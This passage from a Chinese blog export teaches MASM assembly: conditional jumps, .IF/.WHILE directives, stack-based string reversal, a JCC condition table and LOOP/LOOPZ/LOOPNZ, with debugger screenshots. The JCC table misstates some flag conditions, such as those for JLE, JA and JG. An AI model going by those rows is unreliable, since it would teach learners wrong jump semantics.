punctuation">;</span>相等执行下一行</pre></td></tr><tr><td data-num="25"></td><td><pre>	mov x<span class="token punctuation">,</span><span class="token number">1</span></pre></td></tr><tr><td data-num="26"></td><td><pre>	mov y<span class="token punctuation">,</span><span class="token number">1</span></pre></td></tr><tr><td data-num="27"></td><td><pre>	jmp lq<span class="token punctuation">;</span>执行完跳转，结束</pre></td></tr><tr><td data-num="28"></td><td><pre>lp<span class="token operator">:</span><span class="token punctuation">;</span>不相等跳转到此处执行</pre></td></tr><tr><td data-num="29"></td><td><pre>	mov x<span class="token punctuation">,</span><span class="token number">2</span></pre></td></tr><tr><td data-num="30"></td><td><pre>	mov y<span class="token punctuation">,</span><span class="token number">2</span></pre></td></tr><tr><td data-num="31"></td><td><pre>lq<span class="token operator">:</span></pre></td></tr><tr><td data-num="32"></td><td><pre>	push <span class="token number">0</span></pre></td></tr><tr><td data-num="33"></td><td><pre>	call ExitProcess</pre></td></tr><tr><td data-num="34"></td><td><pre>	add esp<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="35"></td><td><pre>main ENDP</pre></td></tr><tr><td data-num="36"></td><td><pre>END main</pre></td></tr></table></figure><p>jnz 指令作用</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220128153113197.png" alt="image-20220128153113197" /></p>
<h4 id="断点测试"><a class="anchor" href="#断点测试">#</a> 断点测试</h4>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220128152500855.png" alt="image-20220128152500855" /></p>
<p>相等	执行下一行代码</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220128152532547.png" alt="image-20220128152532547" /></p>
<p>执行完结束</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220128152558290.png" alt="image-20220128152558290" /></p>
<p>给 eax 赋值为 101，测试不相等时执行情况</p>
<p>可以看到程序跳转到 lp 执行</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220128152702148.png" alt="image-20220128152702148" /></p>
<p>最终结束程序</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220128152738283.png" alt="image-20220128152738283" /></p>
<h3 id="循环结构"><a class="anchor" href="#循环结构">#</a> 循环结构</h3>
<p>利用汇编语言模拟 <code>while</code>  语句</p>
<p>模拟语句</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">while</span><span class="token punctuation">(</span> i <span class="token operator">&lt;</span> <span class="token number">100</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    i <span class="token operator">++</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>jle 指令作用：小于等于 / 不大于时转移</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220128153253015.png" alt="image-20220128153253015" /></p>
<p>汇编语言实现</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">.586</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">.</span>MODEL flat<span class="token punctuation">,</span> stdcall</pre></td></tr><tr><td data-num="3"></td><td><pre>option casemap<span class="token operator">:</span>none</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>include windows<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="6"></td><td><pre>include user32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="7"></td><td><pre>include kernel32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="8"></td><td><pre>include msvcrt<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>includelib user32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="11"></td><td><pre>includelib kernel32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="12"></td><td><pre>includelib msvcrt<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">.</span>data</pre></td></tr><tr><td data-num="15"></td><td><pre>i dword <span class="token number">0</span></pre></td></tr><tr><td data-num="16"></td><td><pre></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token punctuation">.</span>code</pre></td></tr><tr><td data-num="18"></td><td><pre>main proc</pre></td></tr><tr><td data-num="19"></td><td><pre>	mov eax<span class="token punctuation">,</span><span class="token number">100</span></pre></td></tr><tr><td data-num="20"></td><td><pre>lq<span class="token operator">:</span></pre></td></tr><tr><td data-num="21"></td><td><pre>	cmp eax<span class="token punctuation">,</span>i</pre></td></tr><tr><td data-num="22"></td><td><pre>	jle lp</pre></td></tr><tr><td data-num="23"></td><td><pre>	inc i</pre></td></tr><tr><td data-num="24"></td><td><pre>	jmp lq</pre></td></tr><tr><td data-num="25"></td><td><pre>lp<span class="token operator">:</span></pre></td></tr><tr><td data-num="26"></td><td><pre>	push <span class="token number">0</span></pre></td></tr><tr><td data-num="27"></td><td><pre>	call ExitProcess</pre></td></tr><tr><td data-num="28"></td><td><pre>	add esp<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="29"></td><td><pre>main ENDP</pre></td></tr><tr><td data-num="30"></td><td><pre>END main</pre></td></tr></table></figure><h4 id="断点测试-2"><a class="anchor" href="#断点测试-2">#</a> 断点测试</h4>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220128153727050.png" alt="image-20220128153727050" /></p>
<p>实现 <code>i &lt; 100</code>  时， <code>i ++</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220128153806025.png" alt="image-20220128153806025" /></p>
<h2 id="条件控制流伪指令"><a class="anchor" href="#条件控制流伪指令">#</a> 条件控制流伪指令</h2>
<p>32 位模式下，MASM 包含了一些高级条件控制流伪指令（conditional control flow directives），这有助于简化编写条件语句。遗憾的是，这些伪指令不能用于 64 位模式。</p>
<p>对程序进行汇编之前，汇编器执行的是预处理步骤。在这个步骤中，汇编器要识别伪指令，如：.CODE、.DATA，以及一些用于条件控制流的伪指令。</p>
<p>下表列出了这些伪指令</p>
<table>
<thead>
<tr>
<th>伪指令</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>.BREAK</td>
<td>生成代码终止 .WHILE 或 .REPEAT 块</td>
</tr>
<tr>
<td>.CONTINUE</td>
<td>生成代码跳转到 .WHILE 或 .REPEAT 块的顶端</td>
</tr>
<tr>
<td>.ELSE</td>
<td>当 .IF 条件不满足时，开始执行的语句块</td>
</tr>
<tr>
<td>.ELSEIF condition</td>
<td>生成代码测试 condition，并执行其后的语句，直到碰到一个 .ENDIF 或另一个 .ELSEIF 伪指令</td>
</tr>
<tr>
<td>.ENDIF</td>
<td>终止 .IF、.ELSE 或 .ELSEIF 伪指令后面的语句块</td>
</tr>
<tr>
<td>.ENDW</td>
<td>终止 .WHILE 伪指令后面的语句块</td>
</tr>
<tr>
<td>.IF condition</td>
<td>如果 condition 为真，则生成代码执行语句块</td>
</tr>
<tr>
<td>.REPEAT</td>
<td>生成代码重复执行语句块，直到条件为真</td>
</tr>
<tr>
<td>.UNTIL condition</td>
<td>生成代码重复执行 .REPEAT 和 .UNTIL 伪指令之间的语句块，直到 condition 为真</td>
</tr>
<tr>
<td>.UNTILCXZ</td>
<td>生成代码重复执行 .REPEAT 和 .UNTILCXZ 伪指令之间的语句块，直到 CX 为零</td>
</tr>
<tr>
<td>.WHILE condition</td>
<td>当 condition 为真时，生成代码执行 .WHILE 和 .ENDW 伪指令之间的语句块</td>
</tr>
</tbody>
</table>
<h3 id="条件控制流语法"><a class="anchor" href="#条件控制流语法">#</a> 条件控制流语法</h3>
<h4 id="if使用语法"><a class="anchor" href="#if使用语法">#</a> .if 使用语法</h4>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token punctuation">.</span><span class="token keyword">if</span> condition1</pre></td></tr><tr><td data-num="2"></td><td><pre>    statements</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token punctuation">[</span><span class="token punctuation">.</span>elseif condition2</pre></td></tr><tr><td data-num="4"></td><td><pre> 	statements<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token punctuation">[</span><span class="token punctuation">.</span><span class="token keyword">else</span></pre></td></tr><tr><td data-num="6"></td><td><pre> 	statements<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token punctuation">.</span>endif</pre></td></tr></table></figure><p><strong>使用样例</strong></p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token punctuation">.</span>data</pre></td></tr><tr><td data-num="2"></td><td><pre>a1 dword <span class="token number">5</span></pre></td></tr><tr><td data-num="3"></td><td><pre>result dword <span class="token operator">?</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token punctuation">.</span>code</pre></td></tr><tr><td data-num="6"></td><td><pre>mov eax<span class="token punctuation">,</span> <span class="token number">6</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token punctuation">.</span><span class="token keyword">if</span> eax <span class="token operator">></span> a1</pre></td></tr><tr><td data-num="8"></td><td><pre>	mov result<span class="token punctuation">,</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token punctuation">.</span>endif</pre></td></tr></table></figure><h3 id="循环控制流语法"><a class="anchor" href="#循环控制流语法">#</a> 循环控制流语法</h3>
<h4 id="do-while语法"><a class="anchor" href="#do-while语法">#</a> do while 语法</h4>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token punctuation">.</span>repeat</pre></td></tr><tr><td data-num="2"></td><td><pre>    statements</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token punctuation">.</span>until condition</pre></td></tr></table></figure><h4 id="while语法"><a class="anchor" href="#while语法">#</a> while 语法</h4>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token punctuation">.</span><span class="token keyword">while</span> condition</pre></td></tr><tr><td data-num="2"></td><td><pre>    statements</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token punctuation">.</span>endw</pre></td></tr></table></figure><p><strong>使用样例</strong></p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">while</span><span class="token expression">语法使用</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre>mov eax<span class="token punctuation">,</span><span class="token number">0</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token punctuation">.</span><span class="token keyword">while</span> eax <span class="token operator">&lt;</span> <span class="token number">10</span></pre></td></tr><tr><td data-num="4"></td><td><pre>	inc eax</pre></td></tr><tr><td data-num="5"></td><td><pre>	call WriteDec</pre></td></tr><tr><td data-num="6"></td><td><pre>	call Crlf</pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token punctuation">.</span>endw</pre></td></tr></table></figure><figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">do</span> <span class="token expression"><span class="token keyword">while</span>语法使用</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre>mov eax<span class="token punctuation">,</span> <span class="token number">0</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token punctuation">.</span>repeat</pre></td></tr><tr><td data-num="4"></td><td><pre>	inc eax</pre></td></tr><tr><td data-num="5"></td><td><pre>	call WriteDec</pre></td></tr><tr><td data-num="6"></td><td><pre>	call Crlf</pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token punctuation">.</span>until eax <span class="token operator">==</span> <span class="token number">10</span></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>汇编语言</category>
      </categories>
      <tags>
        <tag>汇编语言</tag>
      </tags>
  </entry>
  <entry>
    <title>汇编语言之条件跳转指令JCC与条件循环指令LOOP学习</title>
    <url>/article/b33bdacd.html</url>
    <content><![CDATA[<p>在学习条件跳转指令之前，插入一个堆栈学习的测试样例。</p>
<p><strong>堆栈操作之逆序输出</strong></p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">.586</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">.</span>MODEL flat<span class="token punctuation">,</span> stdcall</pre></td></tr><tr><td data-num="3"></td><td><pre>option casemap<span class="token operator">:</span>none</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>include windows<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="6"></td><td><pre>include user32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="7"></td><td><pre>include kernel32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="8"></td><td><pre>include msvcrt<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>includelib user32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="11"></td><td><pre>includelib kernel32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="12"></td><td><pre>includelib msvcrt<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">.</span>data</pre></td></tr><tr><td data-num="15"></td><td><pre>source byte <span class="token string">"My name is 21r000!"</span><span class="token punctuation">,</span><span class="token number">0</span></pre></td></tr><tr><td data-num="16"></td><td><pre>sourcesize <span class="token operator">=</span> <span class="token punctuation">(</span>$ <span class="token operator">-</span> source<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="17"></td><td><pre></pre></td></tr><tr><td data-num="18"></td><td><pre></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token punctuation">.</span>code</pre></td></tr><tr><td data-num="20"></td><td><pre>main proc</pre></td></tr><tr><td data-num="21"></td><td><pre>	mov ecx<span class="token punctuation">,</span>sourcesize</pre></td></tr><tr><td data-num="22"></td><td><pre>	mov esi<span class="token punctuation">,</span><span class="token number">0</span></pre></td></tr><tr><td data-num="23"></td><td><pre>lp<span class="token operator">:</span></pre></td></tr><tr><td data-num="24"></td><td><pre>	movzx eax<span class="token punctuation">,</span>source<span class="token punctuation">[</span>esi<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="25"></td><td><pre>	push eax</pre></td></tr><tr><td data-num="26"></td><td><pre>	inc esi</pre></td></tr><tr><td data-num="27"></td><td><pre>	loop lp</pre></td></tr><tr><td data-num="28"></td><td><pre>	mov ecx<span class="token punctuation">,</span>sourcesize</pre></td></tr><tr><td data-num="29"></td><td><pre>	mov esi<span class="token punctuation">,</span><span class="token number">0</span></pre></td></tr><tr><td data-num="30"></td><td><pre>lq<span class="token operator">:</span></pre></td></tr><tr><td data-num="31"></td><td><pre>	pop eax</pre></td></tr><tr><td data-num="32"></td><td><pre>	mov source<span class="token punctuation">[</span>esi<span class="token punctuation">]</span><span class="token punctuation">,</span>al</pre></td></tr><tr><td data-num="33"></td><td><pre>	inc esi</pre></td></tr><tr><td data-num="34"></td><td><pre>	loop lq</pre></td></tr><tr><td data-num="35"></td><td><pre>	push <span class="token number">0</span></pre></td></tr><tr><td data-num="36"></td><td><pre>	call ExitProcess</pre></td></tr><tr><td data-num="37"></td><td><pre>	add esp<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="38"></td><td><pre>main ENDP</pre></td></tr><tr><td data-num="39"></td><td><pre>END main</pre></td></tr></table></figure><p>测试代码运行结果，可以看到成功将字符串逆序输出了。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220125184659002.png" alt="image-20220125184659002" /></p>
<h2 id="条件跳转指令jcc"><a class="anchor" href="#条件跳转指令jcc">#</a> 条件跳转指令 JCC</h2>
<p>JCC 指条件跳转指令，CC 就是指条件码。</p>
<table>
<thead>
<tr>
<th>JCC 指令</th>
<th>中文含义</th>
<th>英文原意</th>
<th>检查符号位</th>
<th>典型 C 应用</th>
</tr>
</thead>
<tbody>
<tr>
<td>JZ/JE</td>
<td>若为 0 则跳转；若相等则跳转；</td>
<td>jump if zero;jump if equal</td>
<td>ZF=1</td>
<td>if (i == j);if (i == 0);</td>
</tr>
<tr>
<td>JNZ/JNE</td>
<td>若不为 0 则跳转；若不相等则跳转；</td>
<td>jump if not zero;jump if not equal</td>
<td>ZF=0</td>
<td>if (i != j);if (i != 0);</td>
</tr>
<tr>
<td>JS</td>
<td>若为负则跳转；</td>
<td>jump if sign</td>
<td>SF=1</td>
<td>if (i &lt; 0);</td>
</tr>
<tr>
<td>JNS</td>
<td>若为正则跳转；</td>
<td>jump if not sign</td>
<td>SF=0</td>
<td>if (i &gt; 0);</td>
</tr>
<tr>
<td>JP/JPE</td>
<td>若 1 出现次数为偶数则跳转；</td>
<td>jump if Parity (Even)</td>
<td>PF=1</td>
<td>(null)</td>
</tr>
<tr>
<td>JNP/JPO</td>
<td>若 1 出现次数为奇数则跳转；</td>
<td>jump if not parity (odd)</td>
<td>PF=0</td>
<td>(null)</td>
</tr>
<tr>
<td>JO</td>
<td>若溢出则跳转；</td>
<td>jump if overflow</td>
<td>OF=1</td>
<td>(null)</td>
</tr>
<tr>
<td>JNO</td>
<td>若无溢出则跳转；</td>
<td>jump if not overflow</td>
<td>OF=0</td>
<td>(null)</td>
</tr>
<tr>
<td>JC/JB/JNAE</td>
<td>若进位则跳转；若低于则跳转；若不高于等于则跳转；</td>
<td>jump if carry;jump if below;jump if not above equal</td>
<td>CF=1</td>
<td>if (i &lt; j);</td>
</tr>
<tr>
<td>JNC/JNB/JAE</td>
<td>若无进位则跳转；若不低于则跳转；若高于等于则跳转；</td>
<td>jump if not carry;jump if not below;jump if above equal</td>
<td>CF=0</td>
<td>if (i &gt;= j);</td>
</tr>
<tr>
<td>JBE/JNA</td>
<td>若低于等于则跳转；若不高于则跳转；</td>
<td>jump if below equal;jump if not above</td>
<td>ZF=1 或 CF=1</td>
<td>if (i &lt;= j);</td>
</tr>
<tr>
<td>JNBE/JA</td>
<td>若不低于等于则跳转；若高于则跳转；</td>
<td>jump if not below equal;jump if above</td>
<td>ZF=0 或 CF=0</td>
<td>if (i &gt; j);</td>
</tr>
<tr>
<td>JL/JNGE</td>
<td>若小于则跳转；若不大于等于则跳转；</td>
<td>jump if less;jump if not greater equal</td>
<td>SF != OF</td>
<td>if (si &lt; sj);</td>
</tr>
<tr>
<td>JNL/JGE</td>
<td>若不小于则跳转；若大于等于则跳转；</td>
<td>jump if not less;jump if greater equal</td>
<td>SF = OF</td>
<td>if (si &gt;= sj);</td>
</tr>
<tr>
<td>JLE/JNG</td>
<td>若小于等于则跳转；若不大于则跳转；</td>
<td>jump if less equal;jump if not greater</td>
<td>ZF != OF 或 ZF=1</td>
<td>if (si &lt;= sj);</td>
</tr>
<tr>
<td>JNLE/JG</td>
<td>若不小于等于则跳转；若大于则跳转；</td>
<td>jump if not less equal;jump if greater</td>
<td>SF=0F 且 ZF=0</td>
<td>if(si&gt;sj);</td>
</tr>
</tbody>
</table>
<h3 id="je指令学习测试"><a class="anchor" href="#je指令学习测试">#</a> JE 指令学习测试</h3>
<p>根据 je 指令的特性 &quot;若为 0 则跳转；若相等则跳转&quot;，也就是说若前面赋值的 eax 与后一个数进行比较之后，通过 je 指令测试，若相等就进行跳转</p>
<h5 id="测试样例"><a class="anchor" href="#测试样例">#</a> 测试样例</h5>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">.586</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">.</span>MODEL flat<span class="token punctuation">,</span> stdcall</pre></td></tr><tr><td data-num="3"></td><td><pre>option casemap<span class="token operator">:</span>none</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>include windows<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="6"></td><td><pre>include user32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="7"></td><td><pre>include kernel32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="8"></td><td><pre>include msvcrt<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>includelib user32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="11"></td><td><pre>includelib kernel32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="12"></td><td><pre>includelib msvcrt<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">.</span>data</pre></td></tr><tr><td data-num="15"></td><td><pre></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token punctuation">.</span>code</pre></td></tr><tr><td data-num="17"></td><td><pre>main proc</pre></td></tr><tr><td data-num="18"></td><td><pre>lp<span class="token operator">:</span></pre></td></tr><tr><td data-num="19"></td><td><pre>	mov eax<span class="token punctuation">,</span><span class="token number">250</span></pre></td></tr><tr><td data-num="20"></td><td><pre>	cmp eax<span class="token punctuation">,</span><span class="token number">250</span></pre></td></tr><tr><td data-num="21"></td><td><pre>	je lp</pre></td></tr><tr><td data-num="22"></td><td><pre>	push <span class="token number">0</span></pre></td></tr><tr><td data-num="23"></td><td><pre>	call ExitProcess</pre></td></tr><tr><td data-num="24"></td><td><pre>	add esp<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="25"></td><td><pre>main ENDP</pre></td></tr><tr><td data-num="26"></td><td><pre>END main</pre></td></tr></table></figure><h5 id="断点测试"><a class="anchor" href="#断点测试">#</a> 断点测试</h5>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220127200800894.png" alt="image-20220127200800894" /></p>
<p>可以发现 eax 的值变成了 FA 也就是 250</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220127200832474.png" alt="image-20220127200832474" /></p>
<p>再次运行可以发现 je 实现跳转，一直测试一直跳转</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220127201050380.png" alt="image-20220127201050380" /></p>
<p>测试当 eax 值不等的情况下是否进行跳转，给 eax 赋值为 251</p>
<p>进行测试</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220127202159243.png" alt="image-20220127202159243" /></p>
<p>当进行后 eax 的值变为 FB，也就是 251</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220127202307848.png" alt="image-20220127202307848" /></p>
<p>进行测试后发现，直接进行下一步并没有实现跳转，由此可以发现 je 的跳转条件。</p>
<p>其它指令的作用效果皆可通过测试发现，也可通过金手指查看其它指令作用</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220127202632987.png" alt="image-20220127202632987" /></p>
<h2 id="条件循环指令loop"><a class="anchor" href="#条件循环指令loop">#</a> 条件循环指令 LOOP</h2>
<p>通过之前的学习，我们知道 loop 指令循环的基本条件是 <code>ecx &gt; 0</code></p>
<h3 id="loop指令学习测试"><a class="anchor" href="#loop指令学习测试">#</a> LOOP 指令学习测试</h3>
<h4 id="测试样例-2"><a class="anchor" href="#测试样例-2">#</a> 测试样例</h4>
<p>通过 loop 指令使 eax 自增 10 次</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">.586</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">.</span>MODEL flat<span class="token punctuation">,</span> stdcall</pre></td></tr><tr><td data-num="3"></td><td><pre>option casemap<span class="token operator">:</span>none</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>include windows<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="6"></td><td><pre>include user32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="7"></td><td><pre>include kernel32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="8"></td><td><pre>include msvcrt<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>includelib user32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="11"></td><td><pre>includelib kernel32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="12"></td><td><pre>includelib msvcrt<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">.</span>data</pre></td></tr><tr><td data-num="15"></td><td><pre></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token punctuation">.</span>code</pre></td></tr><tr><td data-num="17"></td><td><pre>main proc</pre></td></tr><tr><td data-num="18"></td><td><pre>	mov eax<span class="token punctuation">,</span><span class="token number">0</span></pre></td></tr><tr><td data-num="19"></td><td><pre>	mov ecx<span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">;</span>循环计数器，每执行一次ecx <span class="token operator">-</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="20"></td><td><pre>lp<span class="token operator">:</span></pre></td></tr><tr><td data-num="21"></td><td><pre>	inc eax</pre></td></tr><tr><td data-num="22"></td><td><pre>	loop lp</pre></td></tr><tr><td data-num="23"></td><td><pre>	push <span class="token number">0</span></pre></td></tr><tr><td data-num="24"></td><td><pre>	call ExitProcess</pre></td></tr><tr><td data-num="25"></td><td><pre>	add esp<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="26"></td><td><pre>main ENDP</pre></td></tr><tr><td data-num="27"></td><td><pre>END main</pre></td></tr></table></figure><h4 id="断点测试-2"><a class="anchor" href="#断点测试-2">#</a> 断点测试</h4>
<p>可以看到初始值均为 0</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220127204201234.png" alt="image-20220127204201234" /></p>
<p>执行一次后 eax = 1</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220127204228389.png" alt="image-20220127204228389" /></p>
<p>ecx 的值由 10 变成了 9</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220127204251076.png" alt="image-20220127204251076" /></p>
<p>执行第二次，eax = 2</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220127204345379.png" alt="image-20220127204345379" /></p>
<p>而 ecx 变成了 8</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220127204409268.png" alt="image-20220127204409268" /></p>
<p>如此直至 ecx=0 结束</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220127204442469.png" alt="image-20220127204442469" /></p>
<h3 id="loopz指令学习"><a class="anchor" href="#loopz指令学习">#</a> loopz 指令学习</h3>
<p>loopz 的跳转条件 <code>ecx &gt; 0 &amp;&amp; zf = 1</code></p>
<p>使用 loopz 后测试可以看到 zf 位的值为 1</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220127204931747.png" alt="image-20220127204931747" /></p>
<p>测试之后发现 ZR = 0 后</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220127205042744.png" alt="image-20220127205042744" /></p>
<p>并没有实现跳转</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220127205114152.png" alt="image-20220127205114152" /></p>
<p>给 eax 赋值为 1 进行测试，并让 eax 自减</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220127205255261.png" alt="image-20220127205255261" /></p>
<p>第一次执行 eax 自减为 0，而 ZR = 1</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220127205340317.png" alt="image-20220127205340317" /></p>
<p>成功实现跳转</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220127205405729.png" alt="image-20220127205405729" /></p>
<p>第二次执行 ZR = 0</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220127205437074.png" alt="image-20220127205437074" /></p>
<p>并未实现跳转</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220127205459990.png" alt="image-20220127205459990" /></p>
<h3 id="loopnz指令学习"><a class="anchor" href="#loopnz指令学习">#</a> loopnz 指令学习</h3>
<p><strong>n = not</strong></p>
<p>loopnz 的跳转条件 <code>ecx &gt; 0 &amp;&amp; zf = 0</code> ，即等于 0 进行跳转，等于 1 不进行跳转</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220127205919545.png" alt="image-20220127205919545" /></p>
